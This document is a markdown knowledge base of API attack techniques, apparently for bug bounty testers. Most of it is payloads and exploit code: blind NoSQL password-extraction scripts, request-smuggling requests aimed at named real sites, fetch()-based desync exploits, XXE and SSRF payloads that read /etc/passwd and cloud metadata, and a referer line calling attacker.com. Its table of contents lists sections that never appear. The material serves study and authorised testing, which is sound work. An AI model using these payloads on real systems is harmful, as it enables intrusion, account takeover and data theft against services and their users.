# API Security Knowledgebase
## Advanced Bug Bounty & Black-Box API Testing Reference

> **Scope**: This document consolidates research-grade techniques, payloads, exploitation chains, and workflows from PortSwigger Web Security Academy, PortSwigger Research, PayloadsAllTheThings, HackTricks, OWASP API Security Top 10, ProjectDiscovery tooling, Assetnote, and real-world bug bounty case studies.

---

## Table of Contents

- [Basics](#basics)
- [API Security Theory](#api-security-theory)
- [REST API Internals](#rest-api-internals)
- [API Authentication Weaknesses](#api-authentication-weaknesses)
- [Authorization Bypasses](#authorization-bypasses)
- [IDOR Chains](#idor-chains)
- [Mass Assignment Attacks](#mass-assignment-attacks)
- [NoSQL Injection Payloads](#nosql-injection-payloads)
- [Server-Side Parameter Pollution](#server-side-parameter-pollution)
- [Hidden Parameter Discovery](#hidden-parameter-discovery)
- [API Key Leakage](#api-key-leakage)
- [Rate Limit Bypasses](#rate-limit-bypasses)
- [GraphQL API Abuse](#graphql-api-abuse)
- [Race Condition + API Chains](#race-condition--api-chains)
- [Request Smuggling + API Chains](#request-smuggling--api-chains)
- [Cache Poisoning + API Chains](#cache-poisoning--api-chains)
- [OAuth + API Chains](#oauth--api-chains)
- [SSRF + API Chains](#ssrf--api-chains)
- [Parser Confusion Payloads](#parser-confusion-payloads)
- [Browser Quirks](#browser-quirks)
- [Gadget Chains](#gadget-chains)
- [Real World Case Studies](#real-world-case-studies)
- [Fuzzing Payloads](#fuzzing-payloads)
- [Automation Workflows](#automation-workflows)
- [Recon Methodology](#recon-methodology)
- [Nuclei Templates](#nuclei-templates)
- [Tools and Scanners](#tools-and-scanners)
- [Advanced Research](#advanced-research)
- [Bug Bounty Writeups](#bug-bounty-writeups)
- [Payload Collections](#payload-collections)
- [WAF Bypasses](#waf-bypasses)
- [Detection Techniques](#detection-techniques)
- [References](#references)

---

## Basics

### What is an API?
An Application Programming Interface (API) enables software systems to communicate and share data. All dynamic websites are composed of APIs. Classic web vulnerabilities (SQL injection, XSS, CSRF) can manifest in API contexts, but APIs also expose additional attack surface not fully utilized by the front-end.

### API Types
- **REST**: Stateless, resource-oriented, typically uses JSON/XML over HTTP.
- **GraphQL**: Single endpoint, query language allowing clients to specify exactly what data they need.
- **SOAP**: XML-based protocol, often uses WSDL for description.
- **gRPC**: Binary protocol over HTTP/2, Protocol Buffers.
- **WebSocket**: Persistent bidirectional connections.

### Core HTTP Concepts for APIs
```http
GET /api/books HTTP/1.1
Host: example.com
```
The endpoint is `/api/books`. APIs accept specific HTTP methods, media formats, and authentication mechanisms.

---

## API Security Theory

### OWASP API Security Top 10 (2023)
1. **API1:2023 – Broken Object Level Authorization (BOLA)** → IDOR
2. **API2:2023 – Broken Authentication** → Weak JWT, brute-force, credential stuffing
3. **API3:2023 – Broken Object Property Level Authorization** → Mass Assignment, Excessive Data Exposure
4. **API4:2023 – Unrestricted Resource Consumption** → Rate limit bypass, DoS
5. **API5:2023 – Broken Function Level Authorization** → Admin endpoints exposed
6. **API6:2023 – Unrestricted Access to Sensitive Business Flows** → Automated abuse
7. **API7:2023 – Server Side Request Forgery (SSRF)**
8. **API8:2023 – Security Misconfiguration** → Default configs, verbose errors, CORS
9. **API9:2023 – Improper Inventory Management** → Shadow APIs, deprecated versions
10. **API10:2023 – Unsafe Consumption of APIs** → Trusting third-party APIs without validation

### Attack Surface Principles
- APIs often expose more functionality than the web UI.
- Documentation may be public even when the API is intended to be private.
- Internal APIs may be reachable from the front-end via parameter pollution or smuggling.
- Error messages frequently disclose stack traces, internal paths, or valid parameter names.

---

## REST API Internals

### Identifying API Endpoints
Look for URL patterns:
- `/api/`, `/v1/`, `/v2/`, `/rest/`, `/graphql`, `/swagger.json`
- JavaScript files referencing endpoints (use JS Link Finder Burp extension)
- Mobile app traffic interception

### Discovering API Documentation
Common documentation paths:
```
/api
/swagger/index.html
/openapi.json
/api-docs
/swagger-ui.html
/v2/api-docs
/api/swagger/v1/users/123  → investigate /api/swagger/v1, /api/swagger, /api
```

Machine-readable docs (OpenAPI/Swagger) can be parsed by Burp Scanner, OpenAPI Parser BApp, Postman, or SoapUI.

### HTTP Method Testing
Endpoints may support unexpected methods:
```
GET /api/tasks      → Retrieve list
POST /api/tasks     → Create
DELETE /api/tasks/1 → Delete
PATCH /api/tasks/1  → Partial update
OPTIONS /api/tasks  → Discover supported methods
```

Use Burp Intruder with the built-in **HTTP verbs** list to cycle through methods. Target low-priority objects to avoid unintended consequences.

### Content-Type Switching
APIs may behave differently based on `Content-Type`:
```http
Content-Type: application/json
Content-Type: application/xml
Content-Type: text/plain
```

Switching content types can:
- Trigger errors disclosing useful information
- Bypass flawed defenses
- Exploit differences in processing logic (JSON safe, XML injectable)

Use the **Content type converter** BApp to convert between XML and JSON automatically.

### Finding Hidden Endpoints
If you identify `PUT /api/user/update`, fuzz for sibling endpoints:
```
/api/user/delete
/api/user/add
/api/user/activate
/api/user/elevate
```

Use wordlists based on common API naming conventions and application-specific terms.

---

## API Authentication Weaknesses

### Common Weaknesses
- **Predictable tokens**: Sequential IDs, UUID v1 (time-based), MongoDB ObjectIds
- **Weak JWT secrets**: `none` algorithm, weak HMAC keys, key confusion (RS256 → HS256)
- **Missing token validation**: Expired tokens accepted, signature not verified
- **Token leakage in logs/URLs**: API keys in query strings, referrer headers
- **Pre-flight CORS misconfigurations**: `Access-Control-Allow-Origin: *` with credentials

### JWT Attacks
```
# Algorithm confusion (RS256 → HS256)
Change alg to HS256 and sign with public key as HMAC secret

# None algorithm
"alg": "none"

# Weak secret brute-force
jwt_tool -t <token> -C -d secrets.txt
```

### API Key Patterns (for recon)
```
AKIA[0-9A-Z]{16}          # AWS
ghp_[a-zA-Z0-9]{36}       # GitHub Personal Access
sk-[a-zA-Z0-9]{48}        # OpenAI/Stripe
AIza[0-9A-Za-z_-]{35}     # Google API
```

---

## Authorization Bypasses

### Horizontal Privilege Escalation
Access resources belonging to other users at the same privilege level by modifying identifiers:
```
GET /api/orders/1001 → GET /api/orders/1002
```

### Vertical Privilege Escalation
Access admin/mod functionality without proper role:
```
GET /api/admin/users
GET /api/v1/admin/config
X-Role: admin
X-Is-Admin: true
```

### Path Normalization Bypasses
```
/api/users/123        → /api/users/123/       → trailing slash handling
/api/users/123        → /api/users/%2e%2e/124  → path traversal in API path
/api/users/123        → /api/users/123%00     → null byte (legacy systems)
/api/users/123        → /api/users/123.json   → format extension bypass
```

### Header-Based Bypasses
```http
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Host: 127.0.0.1
X-HTTP-Host-Override: admin.internal
```

---

## IDOR Chains

### Core Concept
Insecure Direct Object Reference (IDOR) occurs when an application exposes a reference to an internal implementation object (database key, file path, directory) without access control.

### Numeric Value Enumeration
Increment/decrement identifiers:
```
287789 → 287790 → 287791
0x4642d → 0x4642e
1695574808 (Unix epoch timestamps)
```

### Common Identifiers
- Name: `john`, `doe`, `john.doe`
- Email: `john.doe@mail.com`
- Base64 encoded: `am9obi5kb2VAbWFpbC5jb20=`

### Weak Pseudo-Random Generators
- **UUID/GUID v1**: Predictable if creation time is known:
  `95f6e264-bb00-11ec-8833-00155d01ef00`
- **MongoDB ObjectId**: 4-byte epoch + 3-byte machine + 2-byte PID + 3-byte counter:
  `5ae9b90a2c144b9def01ec37`

### Hashed Parameters
If IDs are hashed from predictable values:
```
MD5(username):  098f6bcd4621d373cade4e832627b4f6
SHA1(email):    a94a8fe5ccb19ba61c4c0873d391e987982fbbd3
```

### Wildcard Parameters
Replace IDs with wildcards to retrieve all records:
```http
GET /api/users/* HTTP/1.1
GET /api/users/% HTTP/1.1
GET /api/users/_ HTTP/1.1
GET /api/users/. HTTP/1.1
```

### IDOR Tips & Bypasses
```
# Method switching
POST /api/resource/123 → PUT /api/resource/123

# Content-Type switching
XML → JSON

# Array wrapping
{"id":19} → {"id":[19]}

# Parameter Pollution
user_id=hacker_id&user_id=victim_id

# Case variation
user_id=123 → User_Id=123 → user-id=123

# Encoding
user_id=123 → user_id%3d123

# Path variations
/api/v1/users/123 → /api/v2/users/123 → /api/users/123/
```

### IDOR + Information Disclosure Chain
1. Find endpoint that returns current user profile: `GET /api/me`
2. Observe response contains `user_id`, `email`, `internal_id`
3. Use `internal_id` to access other resources: `GET /api/documents?owner_id=<internal_id>`
4. Chain with Mass Assignment to modify ownership: `PATCH /api/documents/456 { "owner_id": "my_id" }`

---

## Mass Assignment Attacks

### Core Concept
Mass assignment (auto-binding) occurs when frameworks automatically bind request parameters to internal object fields. If sensitive fields are bound without an allowlist, attackers can modify them.

### Detection
1. Send `GET /api/users/123` and observe the response:
```json
{
    "id": 123,
    "name": "John Doe",
    "email": "john@example.com",
    "isAdmin": "false",
    "role": "user",
    "credit_balance": 100
}
```
2. Send `PATCH /api/users/123` with only expected fields:
```json
{
    "username": "wiener",
    "email": "wiener@example.com"
}
```
3. Add the hidden field from the GET response:
```json
{
    "username": "wiener",
    "email": "wiener@example.com",
    "isAdmin": false
}
```
4. Test with an invalid value to confirm processing:
```json
{
    "username": "wiener",
    "email": "wiener@example.com",
    "isAdmin": "foo"
}
```
   → If different error behavior occurs, the parameter is being processed.

5. Exploit with valid value:
```json
{
    "username": "wiener",
    "email": "wiener@example.com",
    "isAdmin": true
}
```

### Real-World Chain: Discount Abuse
```http
GET /api/checkout
# Response contains:
{
    "chosen_discount": {"percentage": 0},
    "chosen_products": [...]
}

POST /api/checkout
# Original request lacks chosen_discount
# Add it:
{
    "chosen_discount": {"percentage": 100},
    "chosen_products": [{"product_id":"1","quantity":1}]
}
```

### Mass Assignment Payloads by Framework

**Ruby on Rails / Django / Laravel (ORM-based)**:
```json
{"user": {"name": "attacker", "admin": true, "role": "admin", "is_staff": true}}
{"name": "attacker", "isAdmin": true, "is_admin": true, "admin": 1}
```

**Common sensitive fields to test**:
```
isAdmin, admin, role, is_staff, is_superuser, permissions,
credit, balance, discount, price, plan, tier, verified,
email_verified, password_reset_token, api_key, secret
```

**Nested object injection**:
```json
{
    "user": {
        "profile": {
            "subscription": {
                "plan": "enterprise"
            }
        }
    }
}
```

---

## NoSQL Injection Payloads

### MongoDB Operator Injection
| Operator | Description |
|----------|-------------|
| `$ne`    | not equal |
| `$gt`    | greater than |
| `$lt`    | lower than |
| `$regex` | regular expression |
| `$nin`   | not in |
| `$where` | JavaScript execution |

### Authentication Bypass
```http
# URL-encoded form data
username[$ne]=toto&password[$ne]=toto
login[$regex]=a.*&pass[$ne]=lol
login[$gt]=admin&login[$lt]=test&pass[$ne]=1
login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto

# JSON body
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt":""}, "password": {"$gt":""}}
```

### Data Extraction via Regex
```http
# Length enumeration
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}

# Character extraction
username[$ne]=toto&password[$regex]=m.{2}
username[$ne]=toto&password[$regex]=md.{1}
username[$ne]=toto&password[$regex]=mdp
username[$ne]=toto&password[$regex]=m.*

# JSON extraction
{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
```

### $in Operator for Enumeration
```json
{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
```

### Duplicate Key Precedence (WAF Bypass)
In MongoDB, if a document contains duplicate keys, only the last occurrence takes precedence:
```json
{"id":"10", "id":"100"}
```

### Blind NoSQL Injection Scripts

**Python - POST JSON**:
```python
import requests, string, urllib3
urllib3.disable_warnings()

username="admin"
password=""
u="http://example.org/login"
headers={'content-type': 'application/json'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
            r = requests.post(u, data=payload, headers=headers, verify=False, allow_redirects=False)
            if 'OK' in r.text or r.status_code == 302:
                print("Found char: %s" % (password+c))
                password += c
```

**Python - POST urlencoded**:
```python
import requests, string, urllib3
urllib3.disable_warnings()

username="admin"
password=""
u="http://example.org/login"
headers={'content-type': 'application/x-www-form-urlencoded'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|','&','$']:
            payload='user=%s&pass[$regex]=^%s&remember=on' % (username, password + c)
            r = requests.post(u, data=payload, headers=headers, verify=False, allow_redirects=False)
            if r.status_code == 302 and r.headers['Location'] == '/dashboard':
                print("Found char: %s" % (password+c))
                password += c
```

---

## Server-Side Parameter Pollution

### Core Concept
Server-Side Parameter Pollution (SSPP) occurs when attacker-controllable parameters are forwarded to internal APIs without proper validation, allowing injection of additional parameters or modification of the internal query.

### Query String Injection
If the back-end constructs a query to another API:
```
Internal API call: GET /internal/api?user_id=123&action=view
Attacker input:    user_id=123&action=delete
Result:            GET /internal/api?user_id=123&action=delete
```

### Parameter Pollution in APIs
```http
# Override first parameter value
GET /api/search?user_id=attacker&user_id=victim

# Array injection
GET /api/users?id[]=1&id[]=2&id[]=3

# Encoding bypass
GET /api/users?id=1%26role=admin

# Nested parameter injection
POST /api/update
{"user": {"id": "123", "role": "admin"}}
```

### JSON Parameter Pollution
When internal APIs accept JSON but the front-end parses form data:
```http
POST /api/transfer HTTP/1.1
Content-Type: application/x-www-form-urlencoded

amount=1000&to=attacker&from=victim%22%7D,%7B%22override%22:%20true%7D
```

Internal API may reconstruct:
```json
{"amount": "1000", "to": "attacker", "from": "victim"}, {"override": true}
```

---

## Hidden Parameter Discovery

### Manual Discovery
- Examine objects returned by GET requests for fields not present in POST/PATCH forms.
- Review JavaScript for references to hidden endpoints and parameters.
- Check mobile app API responses (often more verbose than web).

### Automated Discovery
**Burp Intruder**: Replace existing parameters or add new ones using common parameter name wordlists.

**Param Miner (Burp BApp)**:
- Automatically guesses up to 65,536 parameter names per request.
- Harvests words from in-scope traffic.
- Identifies hidden parameters via binary search and advanced diffing.
- Detects cache poisoning vulnerabilities (fat GET, unkeyed headers).

**Content Discovery Tool**: Finds unlinked content including hidden parameters.

### Wordlist Sources
- Built-in Burp wordlists
- Application-specific terms from recon
- SecLists Fuzzing parameters
- Param Miner auto-harvested terms

---

## API Key Leakage

### Common Causes
- Hardcoding in source code (GitHub, GitLab)
- Public repositories with `.env`, `config.json`, `settings.py`
- Docker images with embedded credentials
- Logs and debug information exposing keys
- Client-side JavaScript containing API keys
- Response headers: `X-API-Key`, `Authorization` in error responses

### Recon for Leaked Keys
```bash
# GitHub organization scan
docker run --rm -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest github --org=target-org

# Repository scan with issues/PRs
docker run --rm -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest github   --repo https://github.com/target/repo --issue-comments --pr-comments

# Docker image scan
docker run --rm -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest docker   --image target/image:latest
```

### Key Validation
Use `mazen160/secrets-patterns-db` to identify the service from regex patterns, then validate:
```bash
# Telegram Bot
curl https://api.telegram.org/bot<TOKEN>/getMe

# AWS
curl -H "Authorization: Bearer $TOKEN" https://sts.amazonaws.com/?Action=GetCallerIdentity

# Generic nuclei token spray
nuclei -t token-spray/ -var token=token_list.txt
```

### Prevention (for developers)
Add to `.pre-commit-config.yaml`:
```yaml
- repo: https://github.com/pre-commit/pre-commit-hooks
  rev: v3.2.0
  hooks:
  - id: detect-aws-credentials
  - id: detect-private-key
```

---

## Rate Limit Bypasses

### Client-IP Spoofing
```http
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 127.0.0.1, 127.0.0.2, 127.0.0.3
X-Real-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
```

### Path/Case Variations
```
/api/v1/login → /api/V1/login → /api/v1/Login
/api/v1/login → /api/v1/login/ → /api/v1/login?
/api/v1/login → /api/v1//login
```

### Parameter Pollution to Bypass
```
/api/login?user=test&user=test2
/api/login?user=test&user=test2&user=test3
```

### Distributed Attack (Race Condition)
Send requests from multiple connections simultaneously to exceed rate limits before counters synchronize:
```bash
# Turbo Intruder / custom script: fire 50 requests in parallel
# Target the exact same endpoint with identical payloads
```

### API Key Rotation
If multiple API keys are available, rotate between them to distribute request load.

---

## GraphQL API Abuse

### Discovery
```
/graphql
/api/graphql
/graphql/console
/graphiql
/playground
```

### Introspection Query
```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

If introspection is disabled, try **field suggestion** queries or error-based probing.

### Common Attacks

**Query Depth / Complexity DoS**:
```graphql
query {
  user {
    friends {
      friends {
        friends {
          friends {
            name
          }
        }
      }
    }
  }
}
```

**Mutation for Unauthorized Actions**:
```graphql
mutation {
  updateUser(id: "victim", role: "admin") {
    id
    role
  }
}
```

**GraphQL Batching for Brute Force**:
```json
[
  {"query": "mutation { login(username: "admin", password: "a") { token } }"},
  {"query": "mutation { login(username: "admin", password: "b") { token } }"},
  ...
]
```

**Alias-based Query Manipulation**:
```graphql
query {
  a1: user(id: "1") { email }
  a2: user(id: "2") { email }
  a3: user(id: "3") { email }
}
```

---

## Race Condition + API Chains

### Core Concept
Race conditions in APIs occur when the server processes multiple requests simultaneously, leading to state manipulation that would be impossible with sequential processing. Classic example: redeeming a single-use gift card twice.

### PortSwigger Lab Technique
1. Identify a state-changing endpoint (e.g., apply discount code, transfer funds).
2. Send multiple identical requests in parallel using Turbo Intruder or Burp Repeater.
3. If the server lacks atomic operations, both may succeed.

### API-Specific Race Scenarios
- **Coupon abuse**: Apply coupon code 10 times simultaneously → balance goes negative or credits stack.
- **Vote manipulation**: Submit multiple votes before counter updates.
- **Limit bypass**: Exceed API call quotas by parallel requests across connections.
- **Double-spend**: Cryptocurrency or token-based systems.

### Turbo Intruder Script for Race
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False)
    for i in range(50):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

---

## Request Smuggling + API Chains

### Core Concepts
HTTP Request Smuggling exploits disagreements between front-end and back-end servers about where a request ends. This allows an attacker to prepend arbitrary content ("prefix") to the next request.

### Classic Desync Vectors

**CL.TE** (Front-end uses Content-Length, Back-end uses Transfer-Encoding):
```http
POST /about HTTP/1.1
Host: example.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

**TE.CL** (Front-end uses Transfer-Encoding, Back-end uses Content-Length):
```http
POST /about HTTP/1.1
Host: example.com
Content-Length: 3
Transfer-Encoding: chunked

6
PREFIX
0

X
```

**TE.TE** (Header obfuscation - one server doesn't recognize TE):
```http
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
X: X[
]Transfer-Encoding: chunked
Transfer-Encoding
: chunked
```

### Detection Methodology (Timeout-Based)
**CL.TE Detection**:
```http
POST /about HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 4

1
Z
Q
```
Front-end forwards `1
Z
` (4 bytes). Back-end waits for chunk terminator → timeout.

**TE.CL Detection**:
```http
POST /about HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```
Front-end sees terminating chunk. Back-end waits for 6 bytes, gets `X` → timeout.

### Confirmation (Socket Poisoning)
```http
POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Transfer-Encoding: zchunked

17
=x&q=smuggling&x=
0
GET /404 HTTP/1.1
Foo: b
```

Followed by normal request. If 404 received, poisoning confirmed.

### Exploitation Chains

**Internal Header Leakage**:
```http
POST / HTTP/1.1
Host: login.newrelic.com
Content-Length: 142
Transfer-Encoding: chunked
Transfer-Encoding: x

0

POST /login HTTP/1.1
Host: login.newrelic.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

login[email]=asdf
```
Victim request gets reflected in `login[email]` parameter, leaking:
```
X-Forwarded-For: 81.139.39.150
X-Forwarded-Proto: https
X-TLS-Bits: 128
X-nr-external-service: external
```

**Internal API Access (New Relic)**:
Using leaked headers to access internal APIs:
```http
POST /login HTTP/1.1
Host: login.newrelic.com
Content-Length: 564
Transfer-Encoding: chunked
Transfer-encoding: cow

0

POST /internal_api/934454/session HTTP/1.1
Host: alerts.newrelic.com
X-Forwarded-Proto: https
Service-Gateway-Account-Id: 934454
Service-Gateway-Is-Newrelic-Admin: true
Content-Length: 6

x=123
```

**Store Attack (Trello)**:
```http
POST /1/cards HTTP/1.1
Host: trello.com
Transfer-Encoding:[tab]chunked
Content-Length: 49f

PUT /1/members/1234 HTTP/1.1
Host: trello.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400

x=x&csrf=1234&username=testzzz&bio=cake
0

GET / HTTP/1.1
Host: trello.com
```
Victim's full request (headers, cookies) gets saved to attacker profile.

**Web Cache Poisoning + Request Smuggling (PayPal)**:
```http
POST /webstatic/r/fb/fb-all-prod.pp2.min.js HTTP/1.1
Host: c.paypal.com
Content-Length: 61
Transfer-Encoding: chunked

0

GET /webstatic HTTP/1.1
Host: skeletonscribe.net?
X: X
```
Victim request for JS file gets redirected to attacker domain. CSP bypass via iframe chaining allowed plaintext password theft.

### Browser-Powered Desync (Client-Side Desync)

**CL.0 / H2.0 Detection**:
```http
POST /b/ HTTP/2
Host: www.amazon.com
Content-Length: 23

GET /404 HTTP/1.1
X: X
```
Back-end ignores Content-Length, treats body as next request.

**Browser Exploit via fetch()**:
```javascript
fetch('https://example.com/', {
    method: 'POST',
    body: "GET /hopefully404 HTTP/1.1
X: Y",
    mode: 'no-cors',
    credentials: 'include'
}).then(() => {
    location = 'https://example.com/'
})
```

**Akamai Stacked HEAD Exploit**:
```javascript
fetch('https://www.capitalone.ca/assets', {
    method: 'POST',
    body: `HEAD /404/?cb=${Date.now()} HTTP/1.1
Host: www.capitalone.ca

GET /x?x=<script>alert(1)</script> HTTP/1.1
X: Y`,
    credentials: 'include',
    mode: 'cors'
}).catch(() => {
    location = 'https://www.capitalone.ca/'
})
```

**Pause-Based Desync (Varnish)**:
Send headers promising a body, then pause. Varnish's `synth()` timeout leaves connection open; body becomes new request.

---

## Cache Poisoning + API Chains

### Core Concept
Web caches save copies of responses. If an attacker can make the cache store a harmful response and serve it to other users, they achieve stored XSS, DoS, or data theft.

### Cache Key Components
Typical cache key: `method + scheme + host + path + query_string`
Unkeyed components (exploitable): headers, cookies, body, parts of query string.

### Methodology
1. **Select Cache Oracle**: Cacheable endpoint with visible hit/miss indicator.
2. **Probe Key Handling**: Test transformations (port stripping, URL decoding, parameter removal).
3. **Chain with Gadgets**: XSS, open redirects, JSONP, resource file injection.

### Cache Oracle Headers
```http
Pragma: akamai-x-get-cache-key, akamai-x-get-true-cache-key
```

### Unkeyed Query Exploitation
If query string is excluded from cache key:
```http
GET //?"><script>alert(1)</script> HTTP/1.1
Host: redacted-newspaper.net
```
Anyone hitting `GET //` receives the poisoned XSS response.

### Cache Parameter Cloaking
Trick cache into excluding arbitrary parameters:
```http
# Akamai (patched but concept remains)
GET /en?x=1?akamai-transform=payload-goes-here HTTP/1.1

# Varnish regex bypass
GET /search?q=help?!&search=1 → 
GET /search?q=help?_=payload&!&search=1
```

### Fat GET
Cache forwards GET body to back-end but doesn't include body in cache key:
```http
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```

### Cache Key Injection
When cache concatenates key components without escaping:
```http
# Akamai
GET /?x=2 HTTP/1.1
Origin: '-alert(1)-'__

# Same key as:
GET /?x=2__Origin='-alert(1)-' HTTP/1.1
```

### Encoded XSS via Cache
Browser encodes XSS payload, server doesn't decode:
```http
# Attacker sends:
GET /?x=%22/%3E%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1

# Victim visits same URL, gets cached unencoded response:
<a href="/?x="/><script>alert(1)</script>
```

### Internal Cache Poisoning
Application-level caches (WP Rocket, template fragments) cache partial responses:
```http
GET /page?dontpoisoneveryone=1 HTTP/1.1
Host: theblog.adobe.com
X-Forwarded-Host: collaborator-id.psres.net
```
Result: Every page on site poisoned with attacker-controlled host in links.

### Cache Magic Tricks
- **PURGE / FASTLYPURGE**: Delete cache entries without auth (useful for live attacks).
- **Path normalization to bypass cache**:
  - Apache: `//`
  - Nginx: `/%2F`
  - PHP: `/index.php/xyz`
  - .NET: `/(A(xyz))/`

---

## OAuth + API Chains

### Common OAuth Vulnerabilities
- **Implicit flow token leakage**: Access token in URL fragment leaked to referrer/logs.
- **Redirect URI manipulation**: Register `evil.com` as redirect, or use path traversal:
  ```
  /callback/../ attacker.com
  /callback%2f%2e%2e%2f attacker.com
  ```
- **State parameter missing/predictable**: CSRF in OAuth linking.
- **Scope escalation**: Modify `scope` parameter to request admin permissions.
- **Code interception**: Open redirect on redirect_uri allows code theft.
- **PKCE downgrade**: Remove `code_challenge` to downgrade to non-PKCE flow.

### OAuth + API Chain
1. Steal OAuth code via open redirect or referrer leakage.
2. Exchange code for access token.
3. Use token to access internal API endpoints.
4. Chain with IDOR to access victim data.
5. Chain with Mass Assignment to elevate privileges.

---

## SSRF + API Chains

### Classic SSRF via APIs
```http
POST /api/fetch HTTP/1.1
Content-Type: application/json

{"url": "http://169.254.169.254/latest/meta-data/"}
```

### SSRF via Header Injection
```http
POST /api/webhook HTTP/1.1
X-Forwarded-Host: internal.api.local
X-HTTP-Host-Override: internal.api.local
```

### SSRF + Request Smuggling (Cracking the Lens)
Reverse proxy misrouting via malformed requests:
```http
GET / HTTP/1.1
Host: uniqid.burpcollaborator.net
```

**Path normalization to SSRF**:
```http
GET / HTTP/1.1
Host: ../?x=.vcap.me
```
Results in internal request to `http://127.0.0.1/`.

**@ symbol in request line**:
```http
GET @burpcollaborator.net/ HTTP/1.1
Host: newrelic.com
```
Apache HttpComponents parses `@burpcollaborator.net/` as authority, routes there.

**Host overriding**:
```http
GET http://internal-website.mil/ HTTP/1.1
Host: xxxxxxx.mil
```

**Ambiguous requests (Incapsula)**:
```http
GET / HTTP/1.1
Host: incapsula-client.net:80@burp-collaborator.net
```

### SSRF via API Callbacks
APIs that fetch user-supplied URLs for previews, webhooks, or analytics:
```http
POST /api/preview HTTP/1.1
Content-Type: application/json

{"url": "file:///etc/passwd"}
{"url": "dict://localhost:11211/"}
{"url": "gopher://localhost:9000/"}
```

### Blind SSRF + Cache
```http
GET /?referer=http://attacker.com/collect HTTP/1.1
```
Analytics system fetches referer URL hours later. Use cache to amplify or store responses.

---

## Parser Confusion Payloads

### Content-Type Parser Confusion
```http
Content-Type: application/json; charset=utf-8; boundary=x
Content-Type: application/json, application/xml
Content-Type: application%2fjson
```

### JSON Parser Confusion
```json
{"id": 1}
{"id": "1"}
{"id": [1]}
{"id": {"id": 1}}
{"id": true}
{"id": null}
{"id": 1.0}
```

### XML External Entity (XXE) in APIs
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

### Parameter Parsing Differences
- PHP: `a[b]=1&a[c]=2` → nested array
- Node/Express: `a[b]=1` → object with key `b`
- Ruby/Rails: `a[]=1&a[]=2` → array
- Java/Spring: `a=1&a=2` → single value (last wins) or array depending on config
- ASP.NET: `a=1&a=2` → comma-separated string

### JSON vs Form Data Confusion
```http
POST /api/login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

{"username": "admin", "password": "admin"}
```
Some APIs parse body as JSON regardless of Content-Type.

---

## Browser Quirks

### Connection Pool Behavior
- Chrome maintains separate connection pools for requests **with** and **without** cookies.
- `credentials: 'include'` in fetch() ensures poisoning the "with-cookies" pool.
- `mode: 'no-cors'` makes connection ID visible in DevTools.

### Stacked Response Problem
Browsers discard connections if they receive more response data than expected. Mitigate by:
- Using cache-busters to delay responses.
- Padding injected requests with lengthy headers.
- Using `HEAD` method to control response length.

### Redirect Handling
- 307 redirects resend POST body to new destination.
- `mode: 'cors'` on fetch() triggers CORS error, preventing automatic redirect follow.
- Use `.catch()` then `location = 'target'` to resume attack.

### Cache Partitioning
Top-level navigation is required to poison the correct cache partition. Iframes/fetch() may use wrong partition.

### HSTS and Mixed Content
- Safari auto-upgrades HTTP to HTTPS if target is in HSTS cache.
- IE mixed-content protection can be bypassed in certain configurations.

### Form-based POST Body Injection
```javascript
let form = document.createElement('form')
form.method = 'POST'
form.action = 'https://target.com/robots.txt'
form.enctype = 'text/plain'
let input = document.createElement('input')
input.name = '0

GET /<svg/onload=alert(1)> HTTP/1.1
Host: target.com

'
input.value = ''
form.appendChild(input)
document.body.appendChild(form)
form.submit()
```

---

## Gadget Chains

### Host-Header Redirect Gadget
```http
GET /+webvpn+/ HTTP/1.1
Host: psres.net
```
Server responds with 302 to attacker domain. Useful for:
- JavaScript import hijacking
- CSS import poisoning
- Open redirect escalation

### HEAD Method Gadget
Use `HEAD` to combine headers with reflected query string:
```http
HEAD /404/?cb=123 HTTP/1.1
```
Response contains headers only. In desync, next response's body is appended, creating HTML.

### DOM Open Redirect Gadget
```javascript
var destination = getQueryParam('redir')
document.location = destination
```
Chain with server-side redirect to control `redir` parameter.

### Resource File Gadgets
JS/CSS files reflecting query string:
```http
GET /style.css?x=a);@import... HTTP/1.1
```
